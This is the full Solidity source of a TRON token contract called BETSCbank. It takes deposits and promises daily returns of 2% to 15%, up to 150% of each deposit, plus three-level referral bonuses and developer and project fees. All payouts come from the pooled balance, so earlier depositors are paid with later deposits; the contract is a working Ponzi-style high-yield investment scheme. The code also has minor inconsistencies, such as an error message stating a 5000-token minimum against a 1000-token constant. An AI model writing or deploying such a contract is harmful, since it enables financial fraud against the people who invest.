//SourceUnit: BETSCbank.sol

pragma solidity 0.5.12;

contract BETSCbank {
    using SafeMath for uint;

    uint private tokenId = 1003482;

    uint private MIN_DEPOSIT = 1000 trx; // 1,000 BETSC
    uint[] private REFERRAL_PERCENTS = [500, 300, 100]; // lvl1 (5%), lvl2 (3%), lvl3 (1%)
    uint private PERCENTS_DIVIDER = 10000;
    uint private BASE_PERCENT = 200; // 2%
    uint private DEVELOPER_FEE = 200; // 2%
    uint private PROJECT_FEE = 300; // 3%
    uint private MAX_CONTRACT_PERCENT = 1500; // 15%
    uint private CONTRAC_PERCENT_STEP = 20000 trx; // +0.01% for every 20,000 BETSC
    uint private TIME_STEP = 1 days;

    uint private PROJECT_FUNDS; // funds provided by the project to keep the contract alive.

    uint public numberInvestors;
    uint public numberDeposits;
	uint public totalInvested;
	uint public totalWithdrawn;
	uint public totalReferralRewards;

	address payable private developerAddress;
	address payable public projectAddress;

    struct Deposit {
        uint64 amount;
        uint64 withdrawn;
        uint32 start;
    }

    struct Investor {
        Deposit[] deposits;
        address referrer;
        uint64 refbonus;
        uint64 refbonus_withdrawn;
        uint32 checkpoint;
        uint24[3] refs;
    }

    mapping(address => Investor) internal investors;

    event NewDeposit(address indexed _user, uint amount);
    event RefBonus(address indexed referrer, address indexed referral, uint amount, uint indexed level);
    event Withdrawn(address indexed _user, uint amount);

    constructor(address payable _devAddr) public {
        developerAddress = _devAddr;
        projectAddress = msg.sender;
    }

    function invest(address referrer) public payable {
        require(msg.tokenid == tokenId, "Send only BETSC tokens");

        uint amount = msg.tokenvalue;

        require(amount >= MIN_DEPOSIT, "Minimum deposit amount 5000 BETSC");

        Investor storage investor = investors[msg.sender];

        require(investor.deposits.length < 100, "Maximum 100 deposits from address");

        developerAddress.transferToken(amount.mul(DEVELOPER_FEE).div(PERCENTS_DIVIDER), tokenId);
        projectAddress.transferToken(amount.mul(PROJECT_FEE).div(PERCENTS_DIVIDER), tokenId);

        if (investor.referrer == address(0) && investors[referrer].deposits.length > 0 && referrer != msg.sender) {
			investor.referrer = referrer;

			address upline = referrer;
			for (uint i = 0; i < 3; i++) {
				if (upline != address(0)) {
					investors[upline].refs[i] += 1;
					upline = investors[upline].referrer;
				} else break;
			}
		}

		if (investor.referrer != address(0)) {
			address upline = investor.referrer;
			for (uint i = 0; i < 3; i++) {
				if (upline != address(0)) {
					uint amountref = amount.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);

					investors[upline].refbonus = uint64(uint(investors[upline].refbonus).add(amountref));
					emit RefBonus(upline, msg.sender, amountref, i);

					upline = investors[upline].referrer;
				} else break;
			}
		}

		if (investor.deposits.length == 0) {
		    investor.checkpoint = uint32(block.timestamp);
			numberInvestors += 1;
		}

		investor.deposits.push(Deposit(uint64(amount), 0, uint32(block.timestamp)));

		totalInvested += amount;
		numberDeposits += 1;

		emit NewDeposit(msg.sender, amount);
    }

    function withdraw() public {
		uint contractBalance = getContractBalance();

		require(contractBalance > 0, "The contract balance is 0");

		Investor storage investor = investors[msg.sender];

        uint ContractPercent = getContractBalanceRate();
		uint totalAmount;
		uint dividends;

		for (uint i = 0; i < investor.deposits.length; i++) {
			if (uint(investor.deposits[i].withdrawn) < uint(investor.deposits[i].amount).div(2).mul(3)) {
			    if (investor.deposits[i].start > investor.checkpoint) {
                    dividends = (uint(investor.deposits[i].amount).mul(ContractPercent).div(PERCENTS_DIVIDER))
                    .mul(block.timestamp.sub(uint(investor.deposits[i].start))).div(TIME_STEP);
                } else {
                    dividends = (uint(investor.deposits[i].amount).mul(ContractPercent).div(PERCENTS_DIVIDER))
                    .mul(block.timestamp.sub(uint(investor.checkpoint))).div(TIME_STEP);
                }

				if (uint(investor.deposits[i].withdrawn).add(dividends) > uint(investor.deposits[i].amount).div(2).mul(3)) {
					dividends = (uint(investor.deposits[i].amount).div(2).mul(3)).sub(uint(investor.deposits[i].withdrawn));
				}

				if (contractBalance > dividends) {
        		    contractBalance -= dividends;
        		} else {
        		    dividends = contractBalance;
        		    contractBalance -= dividends;
        		}

        		investor.deposits[i].withdrawn = uint64(uint(investor.deposits[i].withdrawn).add(dividends));
        		totalAmount += dividends;
			}
		}

		uint referralBonus = investor.refbonus;

		if (referralBonus > 0) {
		    if (contractBalance < referralBonus) {
        	    referralBonus = contractBalance;
        	}
		    totalAmount += referralBonus;
		    totalReferralRewards += referralBonus;
			investor.refbonus_withdrawn = uint64(uint(investor.refbonus_withdrawn).add(referralBonus));
			investor.refbonus = uint64(uint(investor.refbonus).sub(referralBonus));
		}

		require(totalAmount > 0, "User has no dividends");

		msg.sender.transferToken(totalAmount, tokenId);

		investor.checkpoint = uint32(block.timestamp);

		totalWithdrawn += totalAmount;

		if(PROJECT_FUNDS > 0){
		    if(PROJECT_FUNDS > totalAmount){
    		    PROJECT_FUNDS -= totalAmount;
    		} else {
    		    PROJECT_FUNDS = 0;
    		}
		}

		emit Withdrawn(msg.sender, totalAmount);
    }

    function getContractBalance() public view returns (uint) {
		return address(this).tokenBalance(tokenId);
	}

	function getUserTokenBalance(address _user) public view returns (uint){
	    return _user.tokenBalance(tokenId);
	}

	function getContractBalanceRate() public view returns (uint) {
	    uint ContractBalance = getContractBalance();
	    uint ContractPercent = BASE_PERCENT.add((ContractBalance.sub(PROJECT_FUNDS)).div(CONTRAC_PERCENT_STEP));

	    if (ContractPercent < MAX_CONTRACT_PERCENT) {
		    return ContractPercent;
        } else {
            return MAX_CONTRACT_PERCENT;
        }
	}

    function getUserAvailable(address userAddress) public view returns (uint) {
		Investor storage investor = investors[userAddress];
		uint ContractPercent = getContractBalanceRate();

		uint totalDividends;
		uint dividends;

		for (uint i = 0; i < investor.deposits.length; i++) {
		    if (uint(investor.deposits[i].withdrawn) < uint(investor.deposits[i].amount).div(2).mul(3)) {
		        if (investor.deposits[i].start > investor.checkpoint) {
                    dividends = (uint(investor.deposits[i].amount).mul(ContractPercent).div(PERCENTS_DIVIDER))
                    .mul(block.timestamp.sub(uint(investor.deposits[i].start))).div(TIME_STEP);
                } else {
                    dividends = (uint(investor.deposits[i].amount).mul(ContractPercent).div(PERCENTS_DIVIDER))
                    .mul(block.timestamp.sub(uint(investor.checkpoint))).div(TIME_STEP);
                }

				if (uint(investor.deposits[i].withdrawn).add(dividends) > uint(investor.deposits[i].amount).div(2).mul(3)) {
					dividends = (uint(investor.deposits[i].amount).div(2).mul(3)).sub(uint(investor.deposits[i].withdrawn));
				}

				totalDividends += dividends;
			}
		}
		return totalDividends;
	}

	function getUserReferrer(address userAddress) public view returns(address) {
		return investors[userAddress].referrer;
	}

    function getUserReferralBonus(address userAddress) public view returns(uint) {
		return investors[userAddress].refbonus;
	}

    function isActive(address userAddress) public view returns (bool) {
		Investor storage investor = investors[userAddress];

		if (investor.deposits.length > 0) {
			if (investor.deposits[investor.deposits.length-1].withdrawn < (investor.deposits[investor.deposits.length-1].amount + (investor.deposits[investor.deposits.length-1].amount / 2))) {
				return true;
			}
		}
	}

	function getUserDepositsInfo(address userAddress) public view returns(uint[] memory, uint[] memory, uint[] memory) {
	    Investor storage investor = investors[userAddress];

	    uint count;
	    if(investor.deposits.length > 9){
	        count = 10;
	    } else {
	        count = investor.deposits.length;
	    }

        uint[] memory amount = new uint[](count);
        uint[] memory withdrawn = new uint[](count);
        uint[] memory start = new uint[](count);

        uint index = 0;
        for (uint i = investor.deposits.length; i > investor.deposits.length - count; i--) {
            amount[index] = uint(investor.deposits[i-1].amount);
            withdrawn[index] = uint(investor.deposits[i-1].withdrawn);
            start[index] = uint(investor.deposits[i-1].start);
            index++;
        }

        return (amount, withdrawn, start);
	}

	function getUserAmountOfDeposits(address userAddress) public view returns(uint) {
		return investors[userAddress].deposits.length;
	}

	function getUserRefBonusWithdrawn(address userAddress) public view returns(uint) {
		return uint64(uint(investors[userAddress].refbonus_withdrawn).add(investors[userAddress].refbonus));
	}

	function getUserTotalDeposits(address userAddress) public view returns(uint) {
	    Investor storage investor = investors[userAddress];

		uint amount;

		for (uint i = 0; i < investor.deposits.length; i++) {
			amount += investor.deposits[i].amount;
		}

		return amount;
	}

	function getUserTotalWithdrawn(address userAddress) public view returns(uint) {
	    Investor storage investor = investors[userAddress];

		uint amount;

		for (uint i = 0; i < investor.deposits.length; i++) {
			amount += investor.deposits[i].withdrawn;
		}

		return amount.add(investor.refbonus_withdrawn);
	}

	function getUserReferrals(address userAddress) public view returns(uint24[3] memory) {
	    return investors[userAddress].refs;
	}

	function xprojectFunds() public payable {
	    require(msg.sender == projectAddress, "Function only valid for project account");
	    require(msg.tokenid == tokenId, "Send only BETSC tokens");

	    PROJECT_FUNDS += msg.tokenvalue;
	}
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
}